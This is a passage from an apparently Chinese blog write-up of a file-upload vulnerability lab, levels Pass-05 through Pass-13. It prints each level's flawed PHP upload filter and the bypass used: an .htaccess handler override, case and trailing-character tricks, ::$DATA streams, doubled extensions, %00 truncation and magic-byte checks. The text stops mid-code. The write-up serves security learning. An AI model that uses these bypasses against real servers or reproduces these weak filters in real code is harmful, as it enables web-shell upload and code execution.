constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Hack:</p><p>新建文件.htaccess,内容为：(所有文件当php执行)</p><pre><code>SetHandler application/x-httpd-php</code></pre><p>或者（指定jpg当php执行）</p><pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>(win10建没有名字的文件<code>copy htaccess.txt .htaccess</code>)<br><img src="4.png" alt=""></p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>大小写绕过<br>源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>由于上了上面的<code>$file_ext = strtolower($file_ext); //转换为小写</code>，所以可以大小写绕过</p><h4 id="Hack-3"><a href="#Hack-3" class="headerlink" title="Hack"></a>Hack</h4><p>上传一个phpinfo.Php即可</p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>由于缺少trim，可以空格过滤~<br><img src="6.png" alt=""><br>上传成功了，我晕了保存的文件后缀居然也有空格，而且保存的时候没消除~网上说windows保存会默认取消后面的空格？？wtf大家都用win10搭靶场么<br><img src="5.png" alt=""><br>我晕了-这个应该只是单纯的win10漏洞吧</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>还是黑名单，但是没有对后缀名进行去”.”处理,这就要求win10服务器了</p><h4 id="Hack-4"><a href="#Hack-4" class="headerlink" title="Hack:"></a>Hack:</h4><p>利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>少了<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code><br>查了一下<code>::$DATA</code>干嘛的</p><pre><code>在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名 他的目的就是不检查后缀名....</code></pre><p>所以抓包上传，在文件名尾部添加<code>::$DATA</code></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>未递归过滤，可以复写绕过</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>由于构造<code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code>这样的文件名，复写回到第七关</p><h4 id="Hack-5"><a href="#Hack-5" class="headerlink" title="Hack:"></a>Hack:</h4><p>构造<code>phpinfo.php..</code>,这样的文件名</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>过滤了后缀，复写绕过（类似于sql里的selselectect<br>源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php5"</span><span class="token punctuation">,</span><span class="token string">"php4"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">,</span><span class="token string">"php2"</span><span class="token punctuation">,</span><span class="token string">"html"</span><span class="token punctuation">,</span><span class="token string">"htm"</span><span class="token punctuation">,</span><span class="token string">"phtml"</span><span class="token punctuation">,</span><span class="token string">"pht"</span><span class="token punctuation">,</span><span class="token string">"jsp"</span><span class="token punctuation">,</span><span class="token string">"jspa"</span><span class="token punctuation">,</span><span class="token string">"jspx"</span><span class="token punctuation">,</span><span class="token string">"jsw"</span><span class="token punctuation">,</span><span class="token string">"jsv"</span><span class="token punctuation">,</span><span class="token string">"jspf"</span><span class="token punctuation">,</span><span class="token string">"jtml"</span><span class="token punctuation">,</span><span class="token string">"asp"</span><span class="token punctuation">,</span><span class="token string">"aspx"</span><span class="token punctuation">,</span><span class="token string">"asa"</span><span class="token punctuation">,</span><span class="token string">"asax"</span><span class="token punctuation">,</span><span class="token string">"ascx"</span><span class="token punctuation">,</span><span class="token string">"ashx"</span><span class="token punctuation">,</span><span class="token string">"asmx"</span><span class="token punctuation">,</span><span class="token string">"cer"</span><span class="token punctuation">,</span><span class="token string">"swf"</span><span class="token punctuation">,</span><span class="token string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h4 id="Hack-6"><a href="#Hack-6" class="headerlink" title="Hack:"></a>Hack:</h4><p><code>phpinfo.phphpp</code></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>设置了白名单，%00截断<br>源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>%00截断条件</p><pre><code>php版本小于5.3.4详情关注CVE-2006-7243php的magic_quotes_gpc为OFF状态</code></pre><p>Hack:<br>$img_path可以自己控制，%00截断以后服务器会认为是test.php<br>不过我死活绕不过去,Windows服务器也部署了一下好像一样的，嘤嘤嘤<br>（如果burp抓不到本地的包，可以改一下自己的host,然后访问即可<br><img src="7.png" alt=""></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。<br>，依然打不通，<br>burp里先写%00,然后转码方便一些<br><img src="8.jpg" alt=""></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>检验了文件头2个字节,<br>对应关系如下</p><pre><code>jpg-&gt;FF D8 -&gt; 255 216png-&gt;89 50 -&gt;137 90gif-&gt;47 49 -&gt; 71 73</code></pre><!--more--><p>源代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//只读2字节</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$strInfo</span> <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string">'chars1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$typeCode</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string">'jpg'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string">'gif'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>                        <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string">'unknown'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$fileType</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token 